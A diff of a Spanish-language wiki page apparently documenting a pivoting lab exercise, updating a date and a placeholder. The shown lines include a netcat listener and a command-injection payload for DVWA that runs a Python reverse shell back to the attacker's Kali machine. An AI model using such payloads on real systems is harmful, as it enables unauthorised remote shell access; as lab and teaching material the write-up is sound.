@@ -2,7 +2,7 @@
 title: Practica de pivotaje
 description: En está pagina vamos a explicar como se hizo el pivotaje
 published: true
-date: 2024-12-26T15:53:07.302Z
+date: 2024-12-29T21:18:40.118Z
 tags: 
 editor: markdown
 dateCreated: 2024-12-20T19:29:42.236Z
@@ -72,7 +72,7 @@ nc -lvnp (Puerto)
 ```
 Tras esto, como Kali, deberemos acudir al apartado de DVWA:Command Injection. Aquí deberemos escribir lo siguiente:
 ```console
-127.0.0.1;export RHOST="(IP de KALI)";export RPORT=(PUERTO DE KALI);nohup python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")' &
+127.0.0.1;export RHOST="IPKALI";export RPORT=PUERTOKALI;nohup python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")' &
 ```
 
 Esto lo hemos sacado de las siguiente URL: https://www.revshells.com
